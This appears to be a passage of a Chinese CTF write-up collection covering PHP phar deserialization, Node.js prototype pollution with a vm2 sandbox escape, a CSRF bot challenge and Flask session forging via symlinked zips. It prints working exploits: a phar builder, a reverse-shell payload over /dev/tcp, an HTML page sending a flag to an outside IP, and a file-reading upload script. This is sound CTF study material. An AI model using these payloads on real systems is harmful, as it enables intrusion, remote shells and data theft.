+如果是File类的close()，就是获取文件的内容，所以`$this->files`数组里的元素必须为File类的对象
+
+然后看`FileList`类的析构函数
+
+```php
+public function __destruct() {
+    $table = '<div id="container" class="container"><div class="table-responsive"><table id="table" class="table table-bordered table-hover sm-font">';
+    $table .= '<thead><tr>';
+    foreach ($this->funcs as $func) {
+        $table .= '<th scope="col" class="text-center">' . htmlentities($func) . '</th>';
+    }
+    $table .= '<th scope="col" class="text-center">Opt</th>';
+    $table .= '</thead><tbody>';
+    foreach ($this->results as $filename => $result) {
+        $table .= '<tr>';
+        foreach ($result as $func => $value) { //遍历数组 $func为键  $value为对应的值
+            $table .= '<td class="text-center">' . htmlentities($value) . '</td>';
+        }
+        $table .= '<td class="text-center" filename="' . htmlentities($filename) . '"><a href="#" class="download">下载</a> / <a href="#" class="delete">删除</a></td>';
+        $table .= '</tr>';
+    }
+    echo $table;
+}
+```
+
+正好析构函数的作用为输出`$this->funcs`里的元素的值，然后输出`$this->results`数组里的数组元素的键值对，而在`__call()`函数里我们存储的文件的内容就在`$result as $func => $value`的`$value`里
+
+所以只要构造`$this->files`的值，就可以在最后面输出其文件的内容，这样就可以获得flag
+
+故最终的调用链为`User::__destruct() -> FileList::__Call() -> File::close() -> FileList::__destruct()`
+
+**寻找触发点**：可以出发phar反序列化的函数详细可见上方博客，在`open()`有`file_exists`可以触发
+
+```php
+if (strlen($filename) < 40 && $file->open($filename) && stristr($filename, "flag") === false) {
+    Header("Content-type: application/octet-stream");
+    Header("Content-Disposition: attachment; filename=" . basename($filename));
+    echo $file->close();
+} else {
+    echo "File not exist";
+}
+```
+
+`download`和`delete`均可触发，但`download`中有限制
+
+```php
+//只有网站目录和/etc /tmp可以操作
+ini_set("open_basedir", getcwd() . ":/etc:/tmp");
+```
+
+<Aside type='tip'>
+`open_basedir` 将php所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如`fopen()`或`file_get_contents()`等系统函数打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开
+
+如果设置为`ini_set(“open_basedir”,/var)`
+那么就是限制前缀，可以使用任意后缀 ：`/var1 /var/www /varsda/…/`
+
+如果是`ini_set(“open_basedir”,/var/)`
+那么就是限制了目录，只能使用此目录的文件：` /var/www/`
+</Aside>
+
+故利用`delete.php`触发反序列化即可
+
+exp:
+
+```php
+<?php
+class FileList
+{
+    private $files;
+    private $results;
+    private $funcs;
+    public function __construct(){
+        $this->files=array();
+        $a=new File('/flag.txt');
+        array_push($this->files,$a);
+    }
+}
+class File {
+    public $filename;
+    public function __construct($filename){
+        $this->filename=$filename;
+    }
+
+}
+class User
+{
+    public $db;
+}
+$a=new User();
+$b=new FileList();
+$a->db=$b;
+@unlink("phar.phar");
+$phar=new Phar("phar.phar");
+$phar->startBuffering();
+$phar->setStub("<?php __HALT_COMPILER();?>");//设置sutb
+$phar->setMetadata($a);//将自定义的meta-data存入manifest
+$phar->addFromString("1.txt","123123>");//添加要压缩的文件
+//签名自动计算
+$phar->stopBuffering();
+unlink('./phar.jpg');
+rename("./phar.phar","./phar.jpg");
+```
+## [HZNUCTF 2023 final]eznode
+
+**考点**：`NodeJs`、`原型链污染`、`VM沙箱逃逸`
+
+界面提示查看源码，猜测是`node.js`配置错误造成的源码泄露，也可以扫目录访问`app.js`获得源码
+
+```js
+const express = require('express');
+const app = express();
+const { VM } = require('vm2');
+
+app.use(express.json());
+
+const backdoor = function () {
+    try {
+        new VM().run({}.shellcode);
+    } catch (e) {
+        console.log(e);
+    }
+}
+
+const isObject = obj => obj && obj.constructor && obj.constructor === Object;
+const merge = (a, b) => {
+    for (var attr in b) {
+        if (isObject(a[attr]) && isObject(b[attr])) {
+            merge(a[attr], b[attr]);
+        } else {
+            a[attr] = b[attr];
+        }
+    }
+    return a
+}
+const clone = (a) => {
+    return merge({}, a);
+}
+
+
+app.get('/', function (req, res) {
+    res.send("POST some json shit to /.  no source code and try to find source code");
+});
+
+app.post('/', function (req, res) {
+    try {
+        console.log(req.body)
+        var body = JSON.parse(JSON.stringify(req.body));
+        var copybody = clone(body)
+        if (copybody.shit) {
+            backdoor()
+        }
+        res.send("post shit ok")
+    }catch(e){
+        res.send("is it shit ?")
+        console.log(e)
+    }
+})
+
+app.listen(3000, function () {
+    console.log('start listening on port 3000');
+});
+```
+
+
+
+发现一个merge函数，原型链污染的常客，大概就是在页面post传递一个json数据，会经过`json.parse`函数解析，然后再通过`clone()`函数复制到`copybody`变量中，最后判断该变量的shit值是否为真，然后调用`backdoor()`函数在VM2沙箱中执行`{}.shellcode`属性。
+
+`backdoor`函数利用vm2执行`shellcode`，这个`shellcode`其他地方没有得传值，所以我们利用原型链污染传递`shellcode`，污染成`VM2`沙箱逃逸的`payload`即可执行任意命令。
+
+exp:
+
+```html
+POST / HTTP/1.1
+Host: node5.anna.nssctf.cn:28667
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: Hm_lvt_648a44a949074de73151ffaa0a832aec=1715092418,1715151077,1715346525,1715353848; Hm_lpvt_648a44a949074de73151ffaa0a832aec=1715354979
+If-None-Match: W/"45-KUkQHynRoADpxoiD+yQ19DdXfCU"
+Connection: close
+Content-Type: application/json
+Content-Length: 238
+
+{"shit":"1","__proto__":{"shellcode":"let res = import('./app.js'); res.toString.constructor('return this')().process.mainModule.require('child_process').execSync(\"bash -c 'bash -i >&/dev/tcp/ip/port 0>&1'\").toString();"}}
+
+```
+
+> 注意`Content-Type: application/json`
+
+![3150d5aa350ae1c5ebb8ed4568d155aa](https://s2.loli.net/2024/05/11/ro7jKxnGHAsXUcW.png)
+
+## [GKCTF 2021]CheckBot
+
+**考点**：`CSRF`
+
+扫目录发现`index.php`、`admin.php`
+
+注释中有提示
+
+```html
+<!--
+    I am a check admin bot, I will check your URL file suffix!
+    ------------------------------------------------------------
+    POST url for bot!
+-->
+```
+
+`admin.php`有`id=flag`的元素但提示
+
+```html
+<p id="flag">no!you are 222.168.40.174</p>
+```
+
+应该是要本地访问鉴权就会回显flag，在`index.php`以POST方式传url，机器人会在后台点击我们发送的链接，带出flag传回到我们的vps上
+
+关闭防火墙`systemctl stop firewalld.service`，开启http服务访问html文件`python3 -m http.server 8000`
+
+exp:
+
+```html
+<html>
+        <body>
+                <iframe id="flag" src="http://127.0.0.1/admin.php"></iframe>
+                <script>
+                        window.onload = function(){
+                        /* Prepare flag */
+                        let flag = document.getElementById("flag").contentWindow.document.getElementById("flag").innerHTML;
+                        /* Export flag */
+                        var exportFlag = new XMLHttpRequest();
+                        exportFlag.open('get', 'http://39.106.249.221:9000/flagis-' + window.btoa(flag));
+                        exportFlag.send();
+                        }
+                </script>
+        </body>
+</html>
+```
+
+监听端口可得到flag
+
+## [HCTF 2018]Hideandseek
+
+**考点**：`软链接读取文件`、`Flask Session伪造`
+
+导航栏并没有绑定路由，直接任意密码登录发现上传`zip`的功能点，猜测为软链接
+
+尝试制作软链接读取`/etc/passwd`
+
+```zsh
+ln -s /etc/passwd passwd
+zip -y passwd.zip passwd
+```
+
+上传`passwd.zip`成功读取文件，尝试读取`/flag`，无回显
+
+因为可以实现任意账号密码登陆，猜测可能没有数据库，而是通过**Cookie**判断，同时发现`Cookie`中存在`Session`，考点为`Flask`的`Session`伪造，先解密一下
+
+```bash
+[root@CentOs flask-session-cookie-manager-master]# python3 flask_session_cookie_manager3.py decode -c 'eyJ1c2VybmFtZSI6IjEifQ.GSiToA.SThbegmgGhHvJoxadFI0rgHhCfY'
+b'{"username":"1"}'
+```
+
+想要伪造`Session`要知道`Secret_Key`，一般记录在源码中，需要找到源码位置后，配合软链接读取
+
+这里为了快速读取需要的信息，参考网上WP写一个自动化脚本
+
+```python
+#coding=utf-8
+import os
+import requests
+import sys
+
+url = 'http://276bbd4d-16c0-428b-9bda-462c941d026f.node5.buuoj.cn/upload'
+def makezip():
+    os.system('ln -s '+sys.argv[1]+' exp')
+    os.system('zip --symlinks exp.zip exp')
+makezip()
+
+files = {'the_file':open('./exp.zip','rb')}
+def exploit():
+    res = requests.post(url,files=files)
+    print(res.text)
+
+exploit()
+os.system('rm -rf exp')
+os.system('rm -rf exp.zip')
+```
+
+访问Linux的`/proc/self/environ`文件，它存放着环境变量，也就包括`flask`下的环境变量
+
+```bash
+[root@CentOs softlink]# python3 exp.py /proc/self/environ
+/usr/local/lib/python3.6/site-packages/requests/__init__.py:104: RequestsDependencyWarning: urllib3 (1.26.16) or chardet (5.0.0)/charset_normalizer (2.0.12) doesn't match a supported version!
+  RequestsDependencyWarning)
+  adding: exp (stored 0%)
+KUBERNETES_PORT=tcp://10.240.0.1:443KUBERNETES_SERVICE_PORT=443HOSTNAME=outSHLVL=1PYTHON_PIP_VERSION=19.1.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/uwsgi.iniWERKZEUG_SERVER_FD=3NGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/static_=/usr/local/bin/pythonUWSGI_CHEAPER=2WERKZEUG_RUN_MAIN=trueNGINX_VERSION=1.15.8-1~stretchKUBERNETES_PORT_443_TCP_ADDR=10.240.0.1PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.15.8.0.2.7-1~stretchKUBERNETES_PORT_443_TCP_PORT=443KUBERNETES_PORT_443_TCP_PROTO=tcpLANG=C.UTF-8PYTHON_VERSION=3.6.8KUBERNETES_SERVICE_PORT_HTTPS=443NGINX_WORKER_PROCESSES=1KUBERNETES_PORT_443_TCP=tcp://10.240.0.1:443LISTEN_PORT=80STATIC_INDEX=0PWD=/appKUBERNETES_SERVICE_HOST=10.240.0.1PYTHONPATH=/appSTATIC_PATH=/app/staticFLAG=not_flag
+```
+
+给了`/app/uwsgi.ini`，而这个文件是`uwsgi.ini`配置文件，这里学习到这是**uwsgi**服务器的配置文件，其中可能包含有源码路径，生产上一般使用`client —> nginx —> uwsgi --> flask后台程序`的流程，读取其内容
+
+```shell
+[uwsgi]
+module = main
+callable=app
+logto = /tmp/hard_t0_guess_n9p2i5a6d1s_uwsgi.log
+```
+
+由于buu环境配置问题导致此处源码路径错误，在网上找到正确的的源码路径读取
+
+`python3 exp.py /app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py`
+
+```python
+# -*- coding: utf-8 -*-
+from flask import Flask,session,render_template,redirect, url_for, escape, request,Response
+import uuid
+import base64
+import random
+import flag
+from werkzeug.utils import secure_filename
+import os
+random.seed(uuid.getnode())
+app = Flask(__name__)
+app.config['SECRET_KEY'] = str(random.random()*100)
+app.config['UPLOAD_FOLDER'] = './uploads'
+app.config['MAX_CONTENT_LENGTH'] = 100 * 1024
+ALLOWED_EXTENSIONS = set(['zip'])
+
+def allowed_file(filename):
+    return '.' in filename and \
+           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
+
+
+@app.route('/', methods=['GET'])
+def index():
+    error = request.args.get('error', '')
+    if(error == '1'):
+        session.pop('username', None)
+        return render_template('index.html', forbidden=1)
+
+    if 'username' in session:
+        return render_template('index.html', user=session['username'], flag=flag.flag)
+    else:
+        return render_template('index.html')
+
+
+@app.route('/login', methods=['POST'])
+def login():
+    username=request.form['username']
+    password=request.form['password']
+    if request.method == 'POST' and username != '' and password != '':
+        if(username == 'admin'):
+            return redirect(url_for('index',error=1))
+        session['username'] = username
+    return redirect(url_for('index'))
+
+
+@app.route('/logout', methods=['GET'])
+def logout():
+    session.pop('username', None)
+    return redirect(url_for('index'))
+
+@app.route('/upload', methods=['POST'])
+def upload_file():
+    if 'the_file' not in request.files:
+        return redirect(url_for('index'))
+    file = request.files['the_file']
+    if file.filename == '':
+        return redirect(url_for('index'))
+    if file and allowed_file(file.filename):
+        filename = secure_filename(file.filename)
+        file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+        if(os.path.exists(file_save_path)):
+            return 'This file already exists'
+        file.save(file_save_path)
+    else:
+        return 'This file is not a zipfile'
+
+
+    try:
+        extract_path = file_save_path + '_'
+        os.system('unzip -n ' + file_save_path + ' -d '+ extract_path)
+        read_obj = os.popen('cat ' + extract_path + '/*')
+        file = read_obj.read()
+        read_obj.close()
+        os.system('rm -rf ' + extract_path)
+    except Exception as e:
+        file = None
+
+    os.remove(file_save_path)
+    if(file != None):
+        if(file.find(base64.b64decode('aGN0Zg==').decode('utf-8')) != -1):
+            return redirect(url_for('index', error=1))
+    return Response(file)
+
+
+if __name__ == '__main__':
+    #app.run(debug=True)
+    app.run(host='0.0.0.0', debug=True, port=10008)
+```
+
+`app.config['SECRET_KEY'] = str(random.random()*100)`这里的密钥是随机生成的，但是给了种子`random.seed(uuid.getnode())`，我们知道这个`random`是著名的伪随机数，我们只要知道播了的种子就能够生成和它产生一样的随机数
+
+![seed](https://s2.loli.net/2024/05/17/lxAfMJGUFPK2swS.png)
+
+发现`uuid.getnode()`的作用为返回Mac地址的十进制，类似算PIN时，搭配文件读取即可获得
+
+```bash
+python3 exp.py /sys/class/net/eth0/address
+ae:bd:94:bf:71:e9
+```
+
+![calc](https://s2.loli.net/2024/05/17/Eiy48H6hAfIWljb.png)
+
+将其转化为十进制，本地运行得到`key`
+
+```python
+#coding=utf-8
+import random
+
+seed = 192129267626473
+random.seed(seed)
+secret_key = str(random.random()*100)
+print(secret_key)
+# 41.64679886573448
+```
+![ceb0db1d3ce504ff554de9f5f0577952](https://s2.loli.net/2024/05/17/qKxoUalpFGCmbyj.png)
+
+伪造session后登陆可得flag
